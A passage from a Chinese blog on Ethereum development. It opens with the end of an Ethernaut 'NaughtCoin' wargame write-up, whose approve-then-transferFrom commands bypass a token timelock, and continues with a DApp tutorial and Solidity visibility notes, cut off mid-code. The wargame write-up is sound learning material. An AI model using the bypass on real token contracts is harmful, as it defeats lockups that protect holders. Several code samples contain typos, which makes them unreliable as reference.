INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span> ** decimals);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以看到合约只重写了transfer()函数，这里的balances并不是Ether，而是一种token，因此我们只需要给自己授权，然后吧token转给一个账户就行了。  </p>
<blockquote>
<p>await contract.approve(player,1000000<em>(10</em>18))<br>await contract.transferFrom(player,instance,1000000*(10**18));  </p>
</blockquote>
<p>&emsp;&emsp;这样以来我们就吧token全部转出了。  </p>
<hr>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-19</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/19/DAPP开发记录/">DAPP开发记录</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="DAPP的简单原理"><a href="#DAPP的简单原理" class="headerlink" title="DAPP的简单原理"></a>DAPP的简单原理</h3><hr>
<p>&emsp;&emsp;DAPP实在是神奇，理解他的工作原理还是需要熟悉区块链的运作方式，在此记录一下我的心路历程。  </p>
<h4 id="后端在哪"><a href="#后端在哪" class="headerlink" title="后端在哪"></a>后端在哪</h4><p>&emsp;&emsp;每次一想到应用开发就觉得需要前后端的配合，后端总得在一台机器上吧，要不然我咋访问，咋交互？但是DAPP就不是这样，我们似乎只能访问其中的节点，以以太坊为例，每一个参与活动的客户端同时又是一个节点，我们自然可以在本地建立轻节点或者全节点，甚至是测试链，由于贫穷，我们在开发调试时就在测试链上进行。  </p>
<p>&emsp;&emsp;那么所谓的后端实际上是整个区块链，当合约被部署到区块链上时，整个区块链将成为他的数据库，我们将数据称之为负载，将代码称之为合约。合约之所以称之为合约是因为其不可篡改性以及调用时需要付出代价，即<strong>gas</strong>。gas可由eth(以太币)进行兑换，gas将用于奖励确认交易的矿工。这里需要注意，所谓交易的确认不过是新的区块的生成，可能有多个交易被打包在一个区块内，由于去中心化所导致的节点间完全不信任，但是新的区块总需要有个人进行确认，这时，就需要引入一种限制方式，或者说证明自己不是 <strong>骗子</strong> 的条件，即<strong>工作量证明</strong>(Proof of Work)。你如果要添加一个新的区块，你就要付出工作量的代价，因此就会有挖矿这么一说。  </p>
<p>&emsp;&emsp;当然，以上只是简单解释，其中的数学问题相当复杂，比如拜占庭将军问题的处理，等等。而且证明方式也不只是 Proof of work 这么一种。  </p>
<h4 id="合约在哪"><a href="#合约在哪" class="headerlink" title="合约在哪"></a>合约在哪</h4><p>&emsp;&emsp;当你理解了上面的原理之后，这个问题其实很简单，合约自然是在整个区块链上。在remix中进行deploy时，此合约就已经被添加到了区块中，我们在等待区块被确认后，我们通过 <strong>ABI</strong>(Application Binary Interface),即应用二进制接口和<strong>合约的地址</strong>来进行调用。没错，合约本身就是一个地址，也是一个账户，当调用它是要给它冲钱。这个时候我们将数据参数发送至某个节点，在EVM运行合约并处理数据后，可能会将数据添加到链上做数据负载，或者将一些负载返回给客户端。我们也可以调用合约的接口来访问visable的状态变量，以面向对象的思想进行思考总是会得到新的体验，这就是设计模式的魅力所在。</p>
<h4 id="开始构建"><a href="#开始构建" class="headerlink" title="开始构建"></a>开始构建</h4><p>&emsp;&emsp;在做了一部分背景介绍后，我们来进行开发，所需工具如下：  </p>
<ul>
<li><p><strong>remix-ide</strong>  </p>
</li>
<li><p><strong>MetaMask</strong>  </p>
</li>
<li><p><strong>geth</strong>  </p>
</li>
<li><p><strong>lite-server</strong>  </p>
</li>
</ul>
<ol>
<li>合约的部署  </li>
</ol>
<p>&emsp;&emsp;首先我们使用remix-ide，我个人建议本地安装，去github上下载。接下来我们将合约进行编译，目前的通用版本是0.5.5,这里<strong>Environment</strong>应该选择<strong>Injected Web3</strong>。开发的环境选择Ropsten测试链，因为在这条链上我们可以免费获得eth，实在是穷人啊！至于如何获得免费的以太币我们最后再讲。总的设置如下：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_1.png?raw=true" alt="remix-ide">  </p>
<p>&emsp;&emsp;合约会自动编译，接下来我们将合约部署到区块链上，点击下面的deploy：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_3.png?raw=true" alt="deploy">  </p>
<p>&emsp;&emsp;会出现MetaMask的弹框，让你确认是否进行交易，我们可以看到虽然没有向合约支付，但是却要为矿工支付gas。接下来我们等待一段时间后可以看到交易被确认：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/dapp_2.png?raw=true" alt="commit">  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract human&#123;</span><br><span class="line">    uint age;</span><br><span class="line">    string name = &quot;dyf&quot;;</span><br><span class="line"></span><br><span class="line">    function setInfo(uint256 _age, string memory _name) public &#123;</span><br><span class="line">        age =_age;</span><br><span class="line">        name = _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getInfo() public view returns(uint256,string memory )&#123;</span><br><span class="line">        return (age,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; <strong>请注意这里函数的view</strong></p>
<p>&emsp;&emsp;以上是我的交易记录，到这里我们的合约已经部署完毕。下一步是在前端引用合约。</p>
<hr>
<ol start="2">
<li>合约的调用  </li>
</ol>
<p>&emsp;&emsp;在html中，要实现与区块链的交互我们还是需要Web3的api，就像geth一样，只是被迁移到了前端，这里给出api库：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;有时间还得读读他的文档，为了方便起见我们最好使用jQuery库，我觉得挺舒服的，直接给出前端代码：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.3.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">            <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>my dapp<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">'info'</span>&gt;</span>info<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>age:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"button"</span>&gt;</span>Go<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"get"</span>&gt;</span> Get info<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    console.log("web3"+web3);</span></span><br><span class="line"><span class="undefined">    if(typeof web3 != 'undifined')&#123;</span></span><br><span class="line"><span class="undefined">        web3 = new Web3(web3.currentProvider);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    else&#123;</span></span><br><span class="line"><span class="undefined">        web3 = new Web3(new Web3.providers.HttpProvide("http://localhost:8545"));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var infoContract = web3.eth.contract(</span></span><br><span class="line"><span class="undefined">       [</span></span><br><span class="line"><span class="undefined">	    &#123;</span></span><br><span class="line"><span class="undefined">        "constant": true,</span></span><br><span class="line"><span class="undefined">        "inputs": [],</span></span><br><span class="line"><span class="undefined">        "name": "getInfo",</span></span><br><span class="line"><span class="undefined">        "outputs": [</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="undefined">            "name": "",</span></span><br><span class="line"><span class="undefined">            "type": "uint256"</span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="undefined">            "name": "",</span></span><br><span class="line"><span class="undefined">            "type": "string"</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        ],</span></span><br><span class="line"><span class="undefined">        "payable": false,</span></span><br><span class="line"><span class="undefined">        "stateMutability": "view",</span></span><br><span class="line"><span class="undefined">        "type": "function"</span></span><br><span class="line"><span class="undefined">      &#125;,</span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="undefined">        "constant": false,</span></span><br><span class="line"><span class="undefined">        "inputs": [</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="undefined">            "name": "_age",</span></span><br><span class="line"><span class="undefined">            "type": "uint256"</span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="undefined">          &#123;</span></span><br><span class="line"><span class="undefined">            "name": "_name",</span></span><br><span class="line"><span class="undefined">            "type": "string"</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        ],</span></span><br><span class="line"><span class="undefined">        "name": "setInfo",</span></span><br><span class="line"><span class="undefined">        "outputs": [],</span></span><br><span class="line"><span class="undefined">        "payable": false,</span></span><br><span class="line"><span class="undefined">        "stateMutability": "nonpayable",</span></span><br><span class="line"><span class="undefined">        "type": "function"</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">]</span></span><br><span class="line"><span class="undefined">  )</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  var info = infoContract.at('0x3d2f4d5eb88848e75c966118c98f4928aa188f21');</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $("#button").click(function()&#123;</span></span><br><span class="line"><span class="undefined">      var name = $("#name").val();</span></span><br><span class="line"><span class="undefined">      var age = $("#age").val()</span></span><br><span class="line"><span class="undefined">      info.setInfo(age,name,function(error,result)&#123;</span></span><br><span class="line"><span class="undefined">          if(!error)&#123;</span></span><br><span class="line"><span class="undefined">              console.log("ok");</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">  &#125;)</span></span><br><span class="line"><span class="undefined">    $('#get').click(function()&#123;</span></span><br><span class="line"><span class="undefined">        info.getInfo(function(error,result)&#123;</span></span><br><span class="line"><span class="undefined">          $('#info').html("name:"+result[1]+"&amp;emsp;age:"+result[0]);</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;首先验证引入web3成功<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"web3"</span>+web3);</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着我们链接web3的provider或本的链，在这里就是lite-server所创建的服务器环境，lite-server的作用是建立服务器连接，因为MetaMask存在保护，这样才能引入Web3，反正windows用户应该挺难受的。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> web3 != <span class="string">'undifined'</span>)&#123;</span><br><span class="line">       web3 = <span class="keyword">new</span> Web3(web3.currentProvider);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvide(<span class="string">"http://localhost:8545"</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;然后我们生成一个合约对象，这里我们需要编译合约时生成的ABI和地址：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/** 注入合约ABI **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> infoContract = web3.eth.contract(</span><br><span class="line">       [</span><br><span class="line">	    &#123;</span><br><span class="line">        <span class="string">"constant"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"inputs"</span>: [],</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"getInfo"</span>,</span><br><span class="line">        <span class="string">"outputs"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"stateMutability"</span>: <span class="string">"view"</span>,</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"constant"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"inputs"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"_age"</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"_name"</span>,</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"setInfo"</span>,</span><br><span class="line">        <span class="string">"outputs"</span>: [],</span><br><span class="line">        <span class="string">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">      &#125;</span><br><span class="line">]</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 注入合约地址 **/</span></span><br><span class="line">  <span class="keyword">var</span> info = infoContract.at(<span class="string">'0x3d2f4d5eb88848e75c966118c98f4928aa188f21'</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这是我们就得到了一个合约实例，我们可以按照通常面向对象的方式来调用他们的接口。比如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> name = $(<span class="string">"#name"</span>).val();</span><br><span class="line">      <span class="keyword">var</span> age = $(<span class="string">"#age"</span>).val()</span><br><span class="line">      info.setInfo(age,name,<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(<span class="string">"ok"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">    $(<span class="string">'#get'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        info.getInfo(<span class="function"><span class="keyword">function</span>(<span class="params">error,result</span>)</span>&#123;</span><br><span class="line">          $(<span class="string">'#info'</span>).html(<span class="string">"name:"</span>+result[<span class="number">1</span>]+<span class="string">"&amp;emsp;age:"</span>+result[<span class="number">0</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里是基于jQuery的信息交互，我们可以清晰的理解这种调用方式，我们向节点服务器发送交易请求，当交易被确认后，前端的数据可以通过调用接口的方式进行刷新，但是数据的更新会有延迟，毕竟交易的确认需要时间。  </p>
<p>&emsp;&emsp;到这里，一个极端简单的DAPP已经开发完成，但是区块链神奇的思想可见一斑，由此看来我们还是要好好学设计模式和数学才能更加深刻的理解这个神奇的生态环境。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-18</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/18/solidity中令人窒息的语法糖/">solidity中令人窒息的语法糖</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="Solidity函数的困惑"><a href="#Solidity函数的困惑" class="headerlink" title="Solidity函数的困惑"></a>Solidity函数的困惑</h3><hr>
<p>&emsp;&emsp;关于Solidity我看的是不明不白，主要是web3的api几乎一无所知，而且对区块链的理解也不够深刻，在此记录一下一些令我窒息的语法糖。  </p>
<h4 id="1-关于函数的可见型与访问控制"><a href="#1-关于函数的可见型与访问控制" class="headerlink" title="1. 关于函数的可见型与访问控制"></a>1. 关于函数的可见型与访问控制</h4><p>&emsp;&emsp;Solidity封装了两种函数调用方式 <strong><code>internal</code></strong> 与 <strong><code>external</code></strong>   </p>
<ul>
<li><strong>internal</strong> </li>
</ul>
<p>&emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。  </p>
<p>&emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function a() internal &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function b() internal &#123;</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。</p>
<ul>
<li><strong>external</strong>  </li>
</ul>
<p>&emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line">contract test&#123;</span><br><span class="line">    function  a() external &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function b() public &#123;</span><br><span class="line">        a();  //此时会报错</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contract ext&#123;</span><br><span class="line">        function callA(test tmp) public &#123;</span><br><span class="line">            tmp.a();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>public</strong>  </li>
</ul>
<p>&emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() public&#123;&#125;</span><br><span class="line"></span><br><span class="line">    funciton fun2() public &#123;</span><br><span class="line">        fun1();</span><br><span class="line">        this.fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？  </p>
<p>&emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。  </p>
<p>&emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：<strong>public private internal external</strong> .  </p>
<ul>
<li><strong>private</strong>  </li>
</ul>
<p>&emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() private&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function fun2() public&#123;</span><br><span class="line">        fun1();</span><br><span class="line">        //this.fun1()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。</span><br><span class="line"></span><br><span class="line">contract ext is 